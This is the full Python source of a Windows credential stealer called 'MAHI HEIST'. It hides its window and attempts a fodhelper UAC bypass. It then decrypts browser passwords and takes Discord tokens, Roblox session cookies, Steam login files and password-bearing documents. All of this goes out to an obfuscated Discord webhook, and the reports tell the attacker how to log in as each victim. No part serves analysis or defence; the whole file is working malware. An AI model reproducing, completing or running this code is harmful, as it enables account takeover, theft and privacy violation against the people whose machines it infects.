#!/usr/bin/env pythonw
# -*- coding: utf-8 -*-

import os, sys, json, base64, sqlite3, shutil, tempfile, subprocess, ctypes
import re, time, platform, socket, uuid, getpass, traceback, random, zipfile
from pathlib import Path
from datetime import datetime

CUSTOM_WEBHOOK = ""

def _elog(msg):
    try:
        with open(Path(tempfile.gettempdir()) / "heist_debug.log", "a", encoding="utf-8") as f:
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
    except Exception: pass

_elog("=== heist v7 start ===")
_elog(f"frozen={getattr(sys,'frozen',False)} exe={sys.executable}")

try:
    import requests; _elog("requests OK")
except Exception as e:
    _elog(f"requests FAIL: {e}"); sys.exit(0)

_AES_BACKEND = None
try:
    from Cryptodome.Cipher import AES as _AES_MOD
    _AES_BACKEND = "cryptodome"; _elog("crypto: cryptodome")
except ImportError:
    try:
        from Crypto.Cipher import AES as _AES_MOD
        _AES_BACKEND = "cryptodome"; _elog("crypto: pycryptodome")
    except ImportError:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _AESGCM
            from cryptography.hazmat.primitives.ciphers import (
                Cipher as _Cf, algorithms as _alg, modes as _mod)
            _AES_BACKEND = "cryptography"; _elog("crypto: cryptography")
        except ImportError as e:
            _elog(f"crypto ALL FAILED {e}"); sys.exit(0)

try:
    import win32crypt; _elog("win32crypt OK")
except Exception as e:
    _elog(f"win32crypt FAIL: {e}"); sys.exit(0)

class _GC:
    def __init__(s, k, n): s.c = _AES_MOD.new(k, _AES_MOD.MODE_GCM, nonce=n)
    def d(s, ct, tag): return s.c.decrypt_and_verify(ct, tag)
class _BC:
    def __init__(s, k, iv): s.c = _AES_MOD.new(k, _AES_MOD.MODE_CBC, iv=iv)
    def d(s, ct): return s.c.decrypt(ct)
class _GG:
    def __init__(s, k, n): s.a = _AESGCM(k); s.n = n
    def d(s, ct, tag): return s.a.decrypt(s.n, ct + tag, None)
class _BG:
    def __init__(s, k, iv):
        c = _Cf(_alg.AES(k), _mod.CBC(iv)); s.dd = c.decryptor()
    def d(s, ct): return s.dd.update(ct) + s.dd.finalize()
class AES:
    MODE_GCM = "GCM"; MODE_CBC = "CBC"
    @staticmethod
    def new(k, m, nonce=None, iv=None):
        if _AES_BACKEND == "cryptodome":
            return _GC(k, nonce) if m == "GCM" else _BC(k, iv)
        return _GG(k, nonce) if m == "GCM" else _BG(k, iv)

if CUSTOM_WEBHOOK.strip():
    _W = CUSTOM_WEBHOOK.strip()
else:
    _ENC = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MDk3NDU5MDMzNzg4MDE0Ni83aXhfTkNvOFhkTFItTUNJYXJxNS05RzdPS3NqeUsyZFlMd2JkZHhrNHN6U1R4aFVIX2htUEx1a3ZnbnM1V0liMURycg=="
    _W = base64.b64decode(_ENC).decode("utf-8")

PINNED = Path(r"C:\Users\elaki\OneDrive\Desktop\ST3ALER\heist.py")
def script_path():
    if getattr(sys, "frozen", False): return Path(sys.executable).resolve()
    try:
        p = Path(__file__).resolve()
        if p.exists(): return p
    except Exception: pass
    return PINNED
SCRIPT_PATH = script_path()

MAX_FILE_MB = 4
MAX_SCAN_MATCHED = 200
MAX_SCAN_VISITED = 40000
SCAN_DEPTH = 3
SCAN_DIRS = [Path.home() / n for n in ("Desktop","Documents","Downloads","OneDrive")]
NAME_HINTS = ("password","passwd","passwords","creds","credential",
              "login","logins","accounts","wallet","seed","keys")
CONTENT_HINTS = (b"password", b"passwd", b"login", b"token", b"secret",
                 b"apikey", b"api_key", b"private key", b"seed phrase")

def hide_console():
    try:
        k = ctypes.windll.kernel32; u = ctypes.windll.user32
        h = k.GetConsoleWindow()
        if h: u.ShowWindow(h, 0)
        k.FreeConsole()
    except Exception: pass

def relaunch_pythonw():
    if not sys.executable.lower().endswith("python.exe"): return
    pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    if not os.path.exists(pyw): return
    try:
        subprocess.Popen([pyw, str(SCRIPT_PATH)] + sys.argv[1:],
                         creationflags=0x08000000, close_fds=True,
                         cwd=str(SCRIPT_PATH.parent))
    except Exception: pass
    sys.exit(0)

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception: return False

def fodhelper_bypass():
    try:
        import winreg
        pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
        interp = pyw if os.path.exists(pyw) else sys.executable
        cmd = (f'"{SCRIPT_PATH}" --elevated' if getattr(sys,"frozen",False)
               else f'"{interp}" "{SCRIPT_PATH}" --elevated')
        k = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Classes\ms-settings\shell\open\command")
        winreg.SetValueEx(k, "", 0, winreg.REG_SZ, cmd)
        winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(k)
        subprocess.Popen(["fodhelper.exe"], creationflags=0x08000000)
        time.sleep(2.0)
        try: winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
                              r"Software\Classes\ms-settings\shell\open\command")
        except Exception: pass
        return True
    except Exception as e:
        _elog(f"fodhelper FAIL: {e}"); return False

def dpapi(b): return win32crypt.CryptUnprotectData(b, None, None, None, 0)[1]

def local_state_key(d):
    ls = d / "Local State"
    if not ls.exists(): return None
    try:
        data = json.loads(ls.read_text(encoding="utf-8", errors="ignore"))
        enc = data.get("os_crypt", {}).get("encrypted_key")
        if not enc: return None
        raw = base64.b64decode(enc)
        if raw[:5] == b"DPAPI": raw = raw[5:]
        return dpapi(raw)
    except Exception as e:
        _elog(f"local_state {d}: {e}"); return None

def abe_decrypt(blob):
    try:
        import win32com.client
        svc = win32com.client.Dispatch("{708860E0-F641-4611-8895-7D867DD3675B}")
        out = svc.DecryptData(blob.hex())
        if out: return bytes.fromhex(out).decode("utf-8", "ignore")
    except Exception: pass
    return None

def decrypt_browser_pw(key, blob):
    if not blob: return ("", "empty")
    if blob[:3] in (b"v10", b"v11"):
        if not key: return ("", "no-key")
        try:
            nonce, tag, ct = blob[3:15], blob[-16:], blob[15:-16]
            return (AES.new(key,"GCM",nonce=nonce).d(ct,tag).decode("utf-8","ignore"), "ok")
        except Exception:
            return ("", "v10-fail")
    if blob[:3] == b"v20":
        if key:
            try:
                nonce, tag, ct = blob[3:15], blob[-16:], blob[15:-16]
                return (AES.new(key,"GCM",nonce=nonce).d(ct,tag).decode("utf-8","ignore"), "ok-v20-samekey")
            except Exception: pass
        abe = abe_decrypt(blob)
        if abe: return (abe, "ok-abe")
        return ("", "abe-v20-locked")
    try:
        return (dpapi(blob).decode("utf-8","ignore"), "ok-dpapi")
    except Exception:
        return ("", "dpapi-fail")

def _raw_copy_locked(db_path: Path, dst: Path) -> bool:
    try:
        GENERIC_READ = 0x80000000
        OPEN_EXISTING = 3
        FILE_SHARE_RW_DELETE = 0x00000007
        h = ctypes.windll.kernel32.CreateFileW(
            str(db_path), GENERIC_READ, FILE_SHARE_RW_DELETE,
            None, OPEN_EXISTING, 0, None)
        if h in (-1, 0xFFFFFFFFFFFFFFFF): return False
        size = ctypes.windll.kernel32.GetFileSize(h, None)
        if size <= 0:
            ctypes.windll.kernel32.CloseHandle(h); return False
        buf = ctypes.create_string_buffer(size)
        read = ctypes.c_ulong(0)
        ok = ctypes.windll.kernel32.ReadFile(h, buf, size, ctypes.byref(read), None)
        ctypes.windll.kernel32.CloseHandle(h)
        if not ok: return False
        dst.write_bytes(buf.raw[:read.value])
        return True
    except Exception: return False

def harpoon_discord():
    out = []
    try:
        roots = [Path(os.getenv("APPDATA","")) / n for n in
                 ("discord","discordcanary","discordptb","discorddevelopment","Lightcord")]
        for root in roots:
            ld = root / "Local Storage" / "leveldb"
            if not ld.exists(): continue
            key = local_state_key(root)
            for f in ld.glob("*"):
                if f.suffix not in (".ldb",".log"): continue
                try: raw = f.read_bytes()
                except Exception: continue
                blobs = (re.findall(rb"dQw4w9WgXcQ:[^\"]+", raw) +
                         re.findall(rb"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}", raw))
                for b in blobs:
                    tok = None; enc = ""
                    if b.startswith(b"dQw4w9WgXcQ:"):
                        if not key: continue
                        try:
                            dec = base64.b64decode(b[12:])
                            nonce, tag, ct = dec[3:15], dec[-16:], dec[15:-16]
                            tok = AES.new(key,"GCM",nonce=nonce).d(ct,tag).decode("utf-8","ignore")
                            enc = "aes-gcm"
                        except Exception: continue
                    else:
                        tok = b.decode("utf-8","ignore"); enc = "plain"
                    if tok and tok not in [t["token"] for t in out]:
                        out.append({"token": tok, "enc": enc, **fetch_discord_user(tok)})
    except Exception: pass
    return out

def fetch_discord_user(tok):
    try:
        r = requests.get("https://discord.com/api/v10/users/@me",
                         headers={"Authorization": tok}, timeout=6)
        if r.status_code == 200:
            d = r.json()
            return {"username": f"{d.get('username')}#{d.get('discriminator','0')}",
                    "user_id": d.get("id"), "email": d.get("email"),
                    "phone": d.get("phone"), "valid": True}
        return {"username":"(invalid)","user_id":None,"email":None,"phone":None,"valid":False}
    except Exception:
        return {"username":"(unreachable)","user_id":None,"email":None,"phone":None,"valid":False}

BROWSERS = {
    "Chrome":   Path(os.getenv("LOCALAPPDATA","")) / "Google/Chrome/User Data",
    "Edge":     Path(os.getenv("LOCALAPPDATA","")) / "Microsoft/Edge/User Data",
    "Brave":    Path(os.getenv("LOCALAPPDATA","")) / "BraveSoftware/Brave-Browser/User Data",
    "Opera":    Path(os.getenv("APPDATA","")) / "Opera Software/Opera Stable",
    "OperaGX":  Path(os.getenv("APPDATA","")) / "Opera Software/Opera GX Stable",
    "Vivaldi":  Path(os.getenv("LOCALAPPDATA","")) / "Vivaldi/User Data",
    "Chromium": Path(os.getenv("LOCALAPPDATA","")) / "Chromium/User Data",
}

def harpoon_pw():
    out = []
    try:
        for name, base in BROWSERS.items():
            if not base.exists(): continue
            key = local_state_key(base)
            files = list(base.rglob("Login Data")) + list(base.rglob("Login Data For Account"))
            for lf in files:
                try:
                    tmp = Path(tempfile.gettempdir()) / f"_{uuid.uuid4().hex}.db"
                    shutil.copy2(lf, tmp)
                    con = sqlite3.connect(str(tmp))
                    for url, user, enc in con.execute(
                            "SELECT origin_url, username_value, password_value FROM logins").fetchall():
                        pw, status = decrypt_browser_pw(key, enc)
                        out.append({"browser": name, "url": url,
                                    "username": user or "", "password": pw, "status": status})
                    con.close(); tmp.unlink(missing_ok=True)
                except Exception: pass
    except Exception: pass
    return out

def _scan_roblox_db(browser, base: Path, found):
    if not base.exists(): return
    key = local_state_key(base)
    if not key: return

    cookie_dbs = []
    for pat in ("Network/Cookies", "Cookies"):
        for p in base.rglob(pat):
            if p.is_file() and not p.name.endswith("-journal") and p not in cookie_dbs:
                cookie_dbs.append(p)

    for db in cookie_dbs:
        tmp = Path(tempfile.gettempdir()) / f"_ck_{uuid.uuid4().hex}.db"
        try:
            try: shutil.copy2(db, tmp)
            except (PermissionError, OSError):
                if not _raw_copy_locked(db, tmp): continue
            for suf in ("-wal", "-shm"):
                side = Path(str(db) + suf)
                if side.exists():
                    try: shutil.copy2(side, Path(str(tmp) + suf))
                    except Exception:
                        try: _raw_copy_locked(side, Path(str(tmp) + suf))
                        except Exception: pass

            con = sqlite3.connect(f"file:{tmp.as_posix()}?mode=ro", uri=True)
            try:
                rows = con.execute(
                    "SELECT host_key, name, encrypted_value FROM cookies "
                    "WHERE name = '.ROBLOSECURITY'").fetchall()
            finally:
                con.close()

            if not rows: continue
            for host, cname, enc in rows:
                if not enc: continue
                try:
                    if enc[:3] in (b"v10", b"v11"):
                        nonce, tag, ct = enc[3:15], enc[-16:], enc[15:-16]
                        val = AES.new(key,"GCM",nonce=nonce).d(ct,tag).decode("utf-8","ignore")
                    elif enc[:3] == b"v20":
                        try:
                            nonce, tag, ct = enc[3:15], enc[-16:], enc[15:-16]
                            val = AES.new(key,"GCM",nonce=nonce).d(ct,tag).decode("utf-8","ignore")
                        except Exception:
                            val = abe_decrypt(enc)
                    else:
                        val = dpapi(enc).decode("utf-8","ignore")
                    if val and val.strip() and val not in found:
                        found.append(val.strip())
                except Exception: pass
        except Exception: pass
        finally:
            for suf in ("", "-wal", "-shm"):
                try: Path(str(tmp)+suf).unlink(missing_ok=True)
                except Exception: pass

def _cdp_steal(found):
    try:
        from websocket import create_connection
    except ImportError: return

    exe_candidates = [
        ("chrome", Path(os.getenv("PROGRAMFILES",""))   / "Google/Chrome/Application/chrome.exe"),
        ("chrome", Path(os.getenv("PROGRAMFILES(X86)","")) / "Google/Chrome/Application/chrome.exe"),
        ("chrome", Path(os.getenv("LOCALAPPDATA",""))   / "Google/Chrome/Application/chrome.exe"),
        ("edge",   Path(os.getenv("PROGRAMFILES",""))   / "Microsoft/Edge/Application/msedge.exe"),
        ("edge",   Path(os.getenv("PROGRAMFILES(X86)","")) / "Microsoft/Edge/Application/msedge.exe"),
        ("edge",   Path(os.getenv("LOCALAPPDATA",""))   / "Microsoft/Edge/Application/msedge.exe"),
    ]
    exes = [(n,p) for n,p in exe_candidates if p.exists()]
    if not exes: return

    profile_roots = {
        "chrome": Path(os.getenv("LOCALAPPDATA","")) / "Google/Chrome/User Data",
        "edge":   Path(os.getenv("LOCALAPPDATA","")) / "Microsoft/Edge/User Data",
    }

    for bname, exe in exes:
        ud_root = profile_roots.get(bname)
        if not ud_root or not ud_root.exists(): continue

        target_profile = None
        for cand in [ud_root / "Default"] + sorted(ud_root.glob("Profile *")):
            if (cand / "Network/Cookies").exists() or (cand / "Network/Cookies-wal").exists():
                target_profile = cand; break
        if target_profile is None:
            target_profile = ud_root / "Default"
            if not target_profile.exists(): continue

        tmp_root = Path(tempfile.gettempdir()) / f"_cdp_{bname}_{uuid.uuid4().hex}"
        try:
            tmp_root.mkdir(parents=True, exist_ok=True)
            tmp_default = tmp_root / "Default"
            tmp_default.mkdir(exist_ok=True)

            ls = ud_root / "Local State"
            if ls.exists():
                try: shutil.copy2(ls, tmp_root / "Local State")
                except Exception:
                    try: _raw_copy_locked(ls, tmp_root / "Local State")
                    except Exception: pass

            net_src = target_profile / "Network"
            net_dst = tmp_default / "Network"
            net_dst.mkdir(exist_ok=True)
            for fname in ("Cookies","Cookies-wal","Cookies-shm"):
                fs = net_src / fname
                if not fs.exists(): continue
                fd = net_dst / fname
                try: shutil.copy2(fs, fd)
                except Exception:
                    try: _raw_copy_locked(fs, fd)
                    except Exception: pass

            pref = target_profile / "Preferences"
            if pref.exists():
                try: shutil.copy2(pref, tmp_default / "Preferences")
                except Exception:
                    try: _raw_copy_locked(pref, tmp_default / "Preferences")
                    except Exception: pass

            port = random.randint(9300, 9900)
            proc = subprocess.Popen(
                [str(exe), f"--remote-debugging-port={port}",
                 f"--user-data-dir={tmp_root}", "--headless=new",
                 "--no-first-run", "--no-default-browser-check",
                 "--disable-gpu", "--disable-extensions", "about:blank"],
                creationflags=0x08000000, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            ws_url = None
            for _ in range(48):
                time.sleep(0.25)
                try:
                    r = requests.get(f"http://127.0.0.1:{port}/json/version", timeout=1)
                    if r.status_code == 200:
                        ws_url = r.json().get("webSocketDebuggerUrl")
                        if ws_url: break
                except Exception: pass

            if not ws_url:
                try: proc.terminate()
                except Exception: pass
                continue

            try:
                ws = create_connection(ws_url, timeout=10)
                try:
                    ws.send(json.dumps({"id": 1, "method": "Storage.getCookies"}))
                    deadline = time.time() + 10
                    cookies = None
                    while time.time() < deadline:
                        msg = json.loads(ws.recv())
                        if msg.get("id") == 1:
                            cookies = msg.get("result", {}).get("cookies", [])
                            break
                    if cookies is not None:
                        for c in cookies:
                            if c.get("name") == ".ROBLOSECURITY":
                                v = c.get("value","")
                                if v and v not in found: found.append(v)
                finally:
                    try: ws.close()
                    except Exception: pass
            except Exception: pass
            try: proc.terminate()
            except Exception: pass
        except Exception: pass
        finally:
            time.sleep(0.5)
            try: shutil.rmtree(tmp_root, ignore_errors=True)
            except Exception: pass

def harpoon_roblox():
    found = []
    for browser, base in BROWSERS.items():
        try: _scan_roblox_db(browser, base, found)
        except Exception: pass

    wv_roots = [
        Path(os.getenv("LOCALAPPDATA","")) / "Roblox/EBWebView",
        Path(os.getenv("LOCALAPPDATA","")) / "Roblox/Versions/EBWebView",
    ]
    try:
        for pkg in Path(os.getenv("LOCALAPPDATA","")).glob(
                "Packages/ROBLOXCORPORATION.*/LocalCache/EBWebView"):
            wv_roots.append(pkg)
    except Exception: pass
    for wv in wv_roots:
        if wv.exists():
            try: _scan_roblox_db("WebView2", wv, found)
            except Exception: pass

    rbx_roots = [
        Path(os.getenv("LOCALAPPDATA","")) / "Roblox",
        Path(os.getenv("APPDATA","")) / "Roblox",
    ]
    for rr in rbx_roots:
        if not rr.exists(): continue
        try:
            for p in rr.rglob("*.dat"):
                try: raw = p.read_bytes()
                except Exception: continue
                try:
                    text = dpapi(raw).decode("utf-8","ignore")
                    for m in re.findall(r"_[|]WARNING[|][A-Za-z0-9_\-\.]+", text):
                        if m not in found: found.append(m)
                except Exception: pass
                for m in re.findall(rb"_[|]WARNING[|][A-Za-z0-9_\-\.]+", raw):
                    s = m.decode("utf-8","ignore")
                    if s not in found: found.append(s)
        except Exception: pass

    try: _cdp_steal(found)
    except Exception: pass

    return found

def harpoon_steam():
    steam_path = None
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        path, _ = winreg.QueryValueEx(k, "SteamPath")
        steam_path = Path(path)
    except Exception:
        for p in [Path(r"C:\Program Files (x86)\Steam"), Path(r"C:\Program Files\Steam")]:
            if p.exists(): steam_path = p; break

    if not steam_path or not steam_path.exists(): return [], None

    cfg_dir = steam_path / "config"
    users = []

    login_users_vdf = cfg_dir / "loginusers.vdf"
    if login_users_vdf.exists():
        try:
            text = login_users_vdf.read_text(encoding="utf-8", errors="ignore")
            accounts = re.findall(r'"AccountName"\s+"([^"]+)"', text)
            personas = re.findall(r'"PersonaName"\s+"([^"]+)"', text)
            for i in range(max(len(accounts), len(personas))):
                u = accounts[i] if i < len(accounts) else "unknown"
                p = personas[i] if i < len(personas) else "unknown"
                users.append(f"Account: {u} | Persona: {p}")
        except Exception: pass

    zip_bytes = None
    try:
        tmp_zip = Path(tempfile.gettempdir()) / f"steam_{uuid.uuid4().hex}.zip"
        with zipfile.ZipFile(tmp_zip, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in steam_path.glob("ssfn*"):
                zf.write(f, f.name)
            for fn in ("config.vdf", "loginusers.vdf"):
                fp = cfg_dir / fn
                if fp.exists():
                    zf.write(fp, f"config/{fn}")
        zip_bytes = tmp_zip.read_bytes()
        tmp_zip.unlink(missing_ok=True)
    except Exception: pass

    return users, zip_bytes

def harpoon_files():
    out = []; seen = set(); visited = 0
    try:
        for base in SCAN_DIRS:
            if not base.exists(): continue
            for root, dirs, files in os.walk(base):
                rel = os.path.relpath(root, base)
                depth = 0 if rel == "." else rel.count(os.sep) + 1
                if depth >= SCAN_DEPTH: dirs[:] = []
                for fn in files:
                    visited += 1
                    if visited > MAX_SCAN_VISITED: return out
                    if len(out) >= MAX_SCAN_MATCHED: return out
                    p = Path(root) / fn
                    if p.suffix.lower() not in (".txt",".json",".csv",".log",".md"):
                        continue
                    nl = fn.lower()
                    if nl in seen: continue
                    hit = any(h in nl for h in NAME_HINTS)
                    if not hit:
                        try:
                            if p.stat().st_size > MAX_FILE_MB * 1024 * 1024: continue
                            if not any(h in p.read_bytes()[:65536].lower() for h in CONTENT_HINTS):
                                continue
                        except Exception: continue
                    try:
                        size = p.stat().st_size
                        if size > MAX_FILE_MB * 1024 * 1024: continue
                        c = p.read_text(encoding="utf-8", errors="ignore")
                    except Exception: continue
                    seen.add(nl)
                    out.append({"path":str(p),"name":fn,"size":size,"content":c[:200_000]})
    except Exception: pass
    return out

def validate_roblox_cookie(cookie):
    info = {"valid": False, "username": None, "display": None,
            "user_id": None, "robux": None, "premium": None, "error": None}
    try:
        h = {"Cookie": f".ROBLOSECURITY={cookie}",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h, timeout=10)
        if r.status_code != 200:
            info["error"] = f"http {r.status_code}"; return info
        d = r.json()
        info.update({"valid": True, "user_id": d.get("id"), "username": d.get("name"), "display": d.get("displayName")})
        uid = info["user_id"]
        try:
            rb = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=h, timeout=10)
            if rb.status_code == 200: info["robux"] = rb.json().get("robux", "?")
        except Exception: pass
        try:
            pf = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", headers=h, timeout=10)
            if pf.status_code == 200: info["premium"] = bool(pf.json())
        except Exception: pass
    except Exception as e: info["error"] = str(e)
    return info

def hr(c="═", n=64): return c * n

def build_system(tag):
    host = socket.gethostname()
    try: ip = socket.gethostbyname(host)
    except Exception: ip = "0.0.0.0"
    L = ["╔" + hr("═",62) + "╗",
         "║" + " "*15 + "MAHI HEIST — SYSTEM INFO" + " "*21 + "║",
         "╠" + hr("═",62) + "╣"]
    for k, v in [("host", host), ("user", getpass.getuser()), ("ip", ip),
                 ("os", platform.platform()),
                 ("time", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
                 ("pass", tag)]:
        L.append(f"║  {k:<9}: {str(v)[:50]:<50} ║")
    L.append("╚" + hr("═",62) + "╝")
    return "\n".join(L)

def build_discord(disc):
    L = ["██ DISCORD TOKENS (" + str(len(disc)) + ") " + "█"*40, ""]
    if not disc: L.append("(none)")
    for i, t in enumerate(disc, 1):
        L.append(f"[{i}] {t.get('username')}  id={t.get('user_id')}  valid={t.get('valid')}  enc={t.get('enc')}")
        if t.get("email"): L.append(f"    email : {t['email']}")
        if t.get("phone"): L.append(f"    phone : {t['phone']}")
        L.append(f"    token : {t['token']}")
        L.append("")
    return "\n".join(L)

def build_pw(pw):
    ok = sum(1 for x in pw if x["status"].startswith("ok"))
    L = ["██ BROWSER PASSWORDS (" + f"{len(pw)} total, {ok} decrypted" + ") " + "█"*20, ""]
    by_b = {}
    for x in pw: by_b.setdefault(x["browser"], []).append(x)
    for b, entries in by_b.items():
        L.append(f"══ {b} ({len(entries)}) ══")
        for e in entries:
            L.append(f"  url   : {e['url'][:100]}")
            L.append(f"  user  : {e['username']}")
            L.append(f"  pass  : {e['password'] if e['password'] else '<' + e['status'] + '>'}")
            L.append("")
    return "\n".join(L)

def build_roblox(rbx):
    if not rbx:
        return "(none)\n\nNo .ROBLOSECURITY found."

    L = []
    L.append("═" * 70)
    L.append(f"  {len(rbx)} ROBLOX COOKIE(S) FOUND")
    L.append("═" * 70)
    L.append("")
    L.append("HOW TO USE A COOKIE (login as that account):")
    L.append("  1. Open browser -> roblox.com -> Log Out")
    L.append("  2. F12 -> Application -> Cookies -> https://www.roblox.com")
    L.append("  3. Delete .ROBLOSECURITY, then Add new with same name")
    L.append("  4. Paste the value below (one line, no breaks)")
    L.append("  5. Refresh page (F5)")
    L.append("")
    L.append("═" * 70)

    for i, cookie in enumerate(rbx, 1):
        L.append("")
        L.append(f"  ┌── COOKIE #{i} " + "─" * 55)
        L.append("  │")
        info = validate_roblox_cookie(cookie)
        if info["valid"]:
            L.append(f"  │  Username  : {info['username']}")
            L.append(f"  │  Display   : {info['display']}")
            L.append(f"  │  User ID   : {info['user_id']}")
            L.append(f"  │  Robux     : {info['robux']}")
            prem = info.get("premium")
            prem_str = "YES" if prem is True else ("NO" if prem is False else "?")
            L.append(f"  │  Premium   : {prem_str}")
            L.append(f"  │  Status    : ✅ VALID")
        else:
            L.append(f"  │  Status    : ❌ INVALID — {info.get('error','unknown error')}")
        L.append(f"  │  Length    : {len(cookie)} chars")
        L.append("  │")
        L.append("  │  COPY FROM THE LINE BELOW — the whole thing, one line:")
        L.append("  │")
        L.append("  ▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼  COPY START  ▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼▼")
        L.append("")
        L.append(cookie)
        L.append("")
        L.append("  ▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲  COPY END    ▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲▲")
        L.append("")
        L.append("  └" + "─" * 65)

    return "\n".join(L)

def build_steam_txt(users):
    L = ["██ STEAM ACCOUNTS FOUND", ""]
    if not users: L.append("(none — Steam not installed or no users logged in)")
    else:
        for u in users: L.append(f"  {u}")
    L.append("")
    L.append("HOW TO USE THE STEAM FILES (login as that account):")
    L.append("  1. Unzip the attached 'steam_files.zip'")
    L.append("  2. Drop all 'ssfn*' files into your own Steam folder (e.g. C:\\Program Files (x86)\\Steam)")
    L.append("  3. Drop the 'config' folder into your Steam folder, merging/overwriting.")
    L.append("  4. Restart Steam. The account should appear and auto-login.")
    return "\n".join(L)

def build_files(files):
    L = ["██ SAVED CREDENTIAL FILES (" + str(len(files)) + ") " + "█"*30, ""]
    if not files: L.append("(none)")
    for i, f in enumerate(files, 1):
        L.append(f"[{i}] {f['name']} ({f['size']} B)")
        L.append(f"    path : {f['path']}")
        L.append("    ┌── content ──")
        for line in f["content"].splitlines()[:60]:
            L.append(f"    │ {line[:160]}")
        L.append("    └─────────────")
        L.append("")
    return "\n".join(L)

def ship_all(reports):
    for name, content in reports.items():
        if not content: continue
        try:
            file_bytes = content.encode("utf-8") if isinstance(content, str) else content
            r = requests.post(_W,
                data={"content": f"**{name}** ({len(file_bytes)} B)"},
                files={"file": (name, file_bytes)},
                timeout=30)
            if r.status_code == 429: time.sleep(2.0)
        except Exception: pass
        time.sleep(1.0)

def run_pass(tag):
    d = harpoon_discord()
    p = harpoon_pw()
    r = harpoon_roblox()
    s_users, s_zip = harpoon_steam()
    f = harpoon_files()
    
    reports = {
        "system_info.txt":    build_system(tag),
        "discord_tokens.txt": build_discord(d),
        "passwords.txt":      build_pw(p),
        "roblox_cookies.txt": build_roblox(r),
        "steam_accounts.txt": build_steam_txt(s_users),
        "saved_files.txt":    build_files(f),
    }
    if s_zip:
        reports["steam_files.zip"] = s_zip
        
    ship_all(reports)

def main():
    hide_console()
    if "--elevated" not in sys.argv: relaunch_pythonw()
    tag = "elevated" if "--elevated" in sys.argv else "user"
    if tag == "elevated":
        run_pass("elevated"); return
    run_pass("user")
    if not is_admin(): fodhelper_bypass()

if __name__ == "__main__":
    try:
        main()
    except Exception: pass